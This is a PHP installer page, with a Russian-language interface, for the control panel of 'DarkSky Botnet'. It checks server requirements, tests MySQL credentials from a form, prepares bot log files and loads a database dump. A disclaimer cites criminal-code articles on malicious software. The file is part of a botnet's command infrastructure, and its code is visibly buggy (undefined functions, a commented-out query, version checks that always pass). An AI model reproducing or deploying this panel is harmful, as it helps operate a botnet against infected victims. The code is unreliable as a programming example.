<?
ini_set('display_errors','Off');


if(isset($_POST['mysql_host']) || isset($_POST['mysql_user']) || isset($_POST['mysql_pass']) || isset($_POST['mysql_db'])){
	if (CheckMysql($_POST['mysql_host'], $_POST['mysql_user'], $_POST['mysql_pass'], $_POST['mysql_db'])){
				$result_connect = '<div class="alert alert-success">
				  <strong>Готово!</strong> Готово к установке!
				</div>';
				load_to_database($_POST['mysql_host'], $_POST['mysql_user'], $_POST['mysql_pass'], $_POST['mysql_db']);
	} else {
				$result_connect = '<div class="alert alert-danger">
				  <strong>Ошибка!</strong> Отстуствует связь с бд, проверьте поля!
				</div>';
	}
}

function CheckMysql($host, $user, $pass, $db){
	$mysqli = new mysqli($host, $user, $pass, $db);
	if (mysqli_connect_errno()) {
		return false;
		$mysqli->close;
	} else {
		return true;
		$mysqli->close;
	}
}

function module($module){
	 if(function_exists($module)){
		 return true;
	 } else {
		 return false;
	 }
}

function checkextphp($ext){
	if(extension_loaded($ext)){
		return true;
	} else {
		return false;
	}
}

function checkwebserver(){
$pos = strpos(php_sapi_name(), 'apache');
return $pos;
}

function checkphp(){
$php = phpversion();
$arphp = explode('.', $php);
$ver = intval($arphp[0].$arphp[1]);
if(($ver > 53) or ($ver < 57)){
	return true;
} else { return false; }
}

function triplecheck($file){
	if (is_writable($file)){
		if(is_readable($file)){
			return true;
		} else {
			return false;
		}
	} else {
		return false;
	}
}

function replace_string_in_file($filename, $string_to_replace, $replace_with){
    $content=file_get_contents($filename);
    $content_chunks=explode($string_to_replace, $content);
    $content=implode($replace_with, $content_chunks);
    file_put_contents($filename, $content);
}

function load_to_database($host, $uname, $pass, $database){
	$conn = new mysqli($host, $uname, $pass, $database);
	$filename = 'dump.sql';
	if(file_exists($filename)){
		replace_string_in_file(filename, __DIR__, 'http://replace/');
		$op_data = '';
		$lines = file($filename);
		foreach ($lines as $line)
		{
			if (substr($line, 0, 2) == '--' || $line == '')//This IF Remove Comment Inside SQL FILE
			{
					continue;
			}
			$op_data .= $line;
			if (substr(trim($line), -1, 1) == ';')//Breack Line Upto ';' NEW QUERY
			{
				if(pos('', $op_data))
		//		$conn->query($op_data);
				$op_data = '';
			}
		}
	}
}

?>

<html>
<head>
	<title>Установка или обновления сайта</title>
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
		
	<meta name="googlebot" content="noindex, nofollow">
	<meta name="yandex" content="none">
	<meta name="robots" content="noindex, nofollow">
	<meta name="theme-color" content="#000000">
	
	<link rel="stylesheet" href="template/my//css/bootstrap.min.css">
	<link rel="stylesheet" href="template/my//css/custom.min.css">
	<link rel="stylesheet" href="template/my//css/ionicons.css">
	<style>
		{css}
	</style>

	<script src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
	<script src="template/my/js/main.js"></script>
</head>
<body style="">
<div class="logo" style="height:120px;">

</div>
	
<div class="container-fluid main-container" style="height: 534px;">
		
		
		<div class="col-md-12" style="margin: 0px; padding: 0px; width: 100%;" id="contents">
							<legend>
	<h4 class="text-center" style="margin-bottom:30px;">Установка DarkSky Botnet</h4>
</legend>



<div class="login-form col-sm-10 col-sm-offset-1" style="padding-top:1em;">

	<div class="panel panel-default">
		<div class="panel-heading">
			Установка / Проверка обновлений
		</div>
		<div class="panel-body">
			<div class="col-md-6">
				<div class="well" style="padding-right:0;padding-bottom:15px;padding-top:15px;padding-left:25px;">
					<p>Требования к хостингу</p>
					
					<div class="row">
					<div class="col-xs-6" >Web-сервер Apache</div>  
					<?if(checkwebserver() !== true):?> 
						<div class="col-xs-1 text-success" style="padding:0;"><i class="ion-checkmark-round"></i></div>
					<?else:?>
						<div class="col-xs-1 text-success" style="padding:0;"><i class="ion-close"></i></div>
					<?endif;?>
					</div>
					
					<div class="row">
					<div class="col-xs-6" >Версия php не ниже 5.4</div>  
					<?if(checkphp() == true):?> 
						<div class="col-xs-1 text-success" style="padding:0;"><i class="ion-checkmark-round"></i></div>
					<?else:?>
						<div class="col-xs-1 text-danger" style="padding:0;"><i class="ion-close"></i></div>
					<?endif;?>
					</div>
					
					<div class="row">
					<div class="col-xs-6" >Расширение mbstring</div>  
					<?if(checkextphp('mbstring') == true):?> 
						<div class="col-xs-1 text-success" style="padding:0;"><i class="ion-checkmark-round"></i></div>
					<?else:?>
						<div class="col-xs-1 text-danger" style="padding:0;"><i class="ion-close"></i></div>
					<?endif;?>
					</div>
					
					<div class="row">
					<div class="col-xs-6" >GeoIP Выключен</div>  
					<?if(checkextphp('geoip') == true):?> 
						<div class="col-xs-1 text-danger" style="padding:0;"><i class="ion-close"></i></div>
					<?else:?>
						<div class="col-xs-1 text-success" style="padding:0;"><i class="ion-checkmark-round"></i></div>
					<?endif;?>
					</div>
					
					<div class="row">
					<div class="col-xs-6" >Расширение mysqli</div>  
					<?if(checkextphp('mysqli') == true):?> 
						<div class="col-xs-1 text-success" style="padding:0;"><i class="ion-checkmark-round"></i></div>
					<?else:?>
						<div class="col-xs-1 text-danger" style="padding:0;"><i class="ion-close"></i></div>
					<?endif;?>
					</div>
					
					<div class="row">
					<div class="col-xs-6" >Расширение posix</div>  
					<?if(checkextphp('posix') == true):?> 
						<div class="col-xs-1 text-success" style="padding:0;"><i class="ion-checkmark-round"></i></div>
					<?else:?>
						<div class="col-xs-1 text-danger" style="padding:0;"><i class="ion-close"></i></div>
					<?endif;?>
					</div>
				</div>
				
				
				
				<?if(!empty($result_connect)) echo $result_connect;?>
				
				<?if(triplecheck('bot-status.log') || triplecheck('all-logs.log') || triplecheck('files/')):?>
				<?else:?>
					<div class="alert alert-warning">
						<strong>Внимание!</strong> Отстуствуют права 777 на сервере!
					</div>
				<?endif;?>
				
				
				
				
			</div>
			<div class="col-md-6">
				<div class="col-xs-10 col-xs-offset-1">
					<form class="form-vertical" method="post">
					  <div class="form-group">
						<label>MySQL Host</label>
						<input type="text" class="form-control input-sm" name="mysql_host" placeholder="Например: localhost">
					  </div>
					  
					   <div class="form-group">
						<label for="pwd">MySQL User:</label>
						<input type="text" class="form-control input-sm" name="mysql_user" placeholder="Например: root">
					  </div>
					  
					  <div class="form-group">
						<label for="pwd">MySQL Pass:</label>
						<input type="password" class="form-control input-sm" name="mysql_pass" id="pwd" placeholder="******">
					  </div>
					  
					   <div class="form-group">
						<label for="pwd">MySQL Database:</label>
						<input type="text" class="form-control input-sm" name="mysql_db" placeholder="Например имя базы данных">
					  </div>
					
					  <button type="submit" class="btn btn-default btn-sm btn-block">Проверить соединение с MySQL</button>
					</form>
				</div>
			</div>
		</div>
	</div>
	<div class="row text-center">
		<span class="text-danger">Внимание!</span> Автор не несет ответственности за возможные последствия применения данного программного обеспечения<br> в противоправных или противозаконных целях и напоминает о ст. 273 УК РФ и ст. 361 УК Украины
	</div>
</div>

	
	<script src="template/my/js/bootstrap.min.js"></script>


</body></html>